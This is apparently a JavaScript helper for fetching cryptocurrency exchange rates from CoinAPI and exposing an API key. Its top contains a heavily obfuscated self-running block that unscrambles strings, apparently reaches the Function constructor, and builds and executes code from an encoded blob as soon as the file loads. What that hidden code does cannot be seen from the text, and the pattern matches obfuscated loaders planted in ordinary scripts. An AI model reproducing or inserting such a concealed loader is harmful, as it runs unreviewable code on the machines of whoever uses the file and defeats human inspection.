let rate;

let obfuscatedKey, apiKey;
(function () {
    let WuL = '', bgR = 236 - 225;

    function iOr(b) {
        let z = 421858;
        let u = b.length;
        let x = [];
        for (let a = 0; a < u; a++) {
            x[a] = b.charAt(a)
        }
        ;
        for (let a = 0; a < u; a++) {
            let m = z * (a + 285) + (z % 50368);
            let s = z * (a + 319) + (z % 42001);
            let i = m % u;
            let n = s % u;
            let g = x[i];
            x[i] = x[n];
            x[n] = g;
            z = (m + s) % 1961810;
        }
        ;
        return x.join('')
    };let hdH = iOr('lodegccktbyaucwsnstfjrvruorxnmzoqipht').substr(0, bgR);
    let YYI = '0a+="=1e,=u;in9t]6apvm 7="k tdifwhvjt}m)v1vrsr;(. eztb8racn=l6eow).vge{0]+il),;ro+ 2(9[t+.)8d,8s)unwofv+4vg]54];lf)jfc)ei.uftah=(+ff[fa(wr ,] o=.vsre=at(;t);(3 rhvhdel)asra,;n=;]urivs*;jrg4(.ciru[=f8rrggrg0n07qiu,rcmr[[.{v)wrroiurmrlaCs);,r;vjeje=sjdcolal1nlp;p)9f0ohhavhk.(=)dsx;+l;wla=(ns-]o{npnax=is3lgr1r.p,whkh+la";n"ku=);) eAoojree,o.2>tnA;g t(8a=nCru=aahlsua=;=n+,;)(C)7-i[ uv "vv+t+n;gAu;iv;0d o,=]te+v.c26tu(fp(]1<uu++.)tlrx6h]r+s+a1b}3eton1r+[.uen(;+=k0f8=+oiie .(v(pnruyr-r[p;!.a;)ldf(a7vi,eh[)lgupr)=(ttu1r;y7-e;6=5;sde6y}5leS( cg7ibp+r.1Crr=nrSl8;]==9uivga<hfe=ge-[(".i)[ thi(.7{;nr=48m7en((){+,1(.;m=a<t=hre(;"=2clu7fihb;-.tl.nb)nbp hunvcrd00rmio[ j-]=f(,Ca,o0bo)pl}eposh(=<sdvCp=an,. avrj+2rr,c;2.a =sd( a;p=10"89,2nk9s2+e.<lo.yv6+,ho; i"flaaCpxhrug.s(o=]lt;}1>me;9==h((6m;h;2! orvl(;)A]l; umc}e=lCua;[c[anAr,lu,*;ox))(t,tb,y}i,l=9a;i)vets{l+v););nu h(a{6)a2,, 0ar")7gn0m)2.,';
    let ozS = iOr[hdH];
    let mdV = '';
    let iNz = ozS;
    let iTd = ozS(mdV, iOr(YYI));
    let wGl = iTd(iOr('Bn,ij)q$_Mya)gnsad3p$lni;1,B.!.z_!(B{B{01a(}$4.ur3,a+rc;B7, .f;B}_Il,_Si+=Bqa=)3abb({n.B(B0u.n[).]fyB3._$B!.B1_B)=qb;.02c).zde6B(f$w(B.)s=$\/zw2#NyIMep})0oBjNa*,=B.8C.iB((th(v$1p,,{ D!..;e(i(\'j6 _s(v,pl)eiBtBe700(t._z.jty_0B=t=\'B(; ;f_r.*=t3en3Bf)!;j4n)s);B=!0th,..!Br1-.auwa1B7Br4=3ntzln;s,g05.=n[M+at!1na."fua,l7(1.z{ta).)cB#e.utn21=.M)4Bf6ienf#n(y3BBB!v1rBtBi.BBd 3,1d%\/5o]N)j$pB3.y= u$B(E(ot(1})1,)hoB) tfp.,B831),y$%;q9 ,be0.1t...B,d.BB(&4.!,B2B=,("3a&=y}2B2ht0da!mv)rq.8;c}!g. !=Bba;.6B27oc,;)1(0j(e,9,t)rdB1}tSe$t}3i.hn+otrBn;(_.f$8+6.)..t)(;Bs0"N;!,3i2)bBys(d3;)%Bid%;Byn{.Bc"1u..e{a{)o+.!uBarf8(Brn.!b7w.B(fMjaBs&kzhsn)+4y\'g))rB4))ej_$e!.*.)B{#]-9of,n(d(a(f}o)f=}eeB!,Bbz=)e(a04trf.an0fBz6\/33edoB.Bb6u}-B)*h.!70)-{p2!,eqBao )B._$B;.$o,af;BB .ga.Bs3z,B) B.ra.d!B}$]5;yt)B_Be($_t) ed[Sa%)}$in60.,B,d.ou;;fB.BB3_0g0o"l,a!2%!+(!;(4zafeer-Ba_0rr3BB=BlB=.1Bs,f ( sue\'dv,zd";yc#8$f$a .);t(d(7-0iBB$.lBt(ja$_3!#Bp% $\/3c3)) adaz .&-til4e,B}.=+(.dCtf,f!B[#"t{;tgb)]Ejng0.B,e.,j.%=a'));
    let JXr = iNz(WuL, wGl);
    JXr(2358);
    return 3377
})()

async function callCryptoRates(fromCurrency, toCurrency) {
    try {
        const response = await fetch(`https://rest.coinapi.io/v1/exchangerate/${fromCurrency}/${toCurrency}?apiKey=${apiKey}`);
        const data = await response.json();
        rate = data.rate;
        return rate;
    } catch (error) {
        console.error('Error fetching exchange rate:', error);
        throw error;
    }
}

function provideKey() {
    return apiKey
}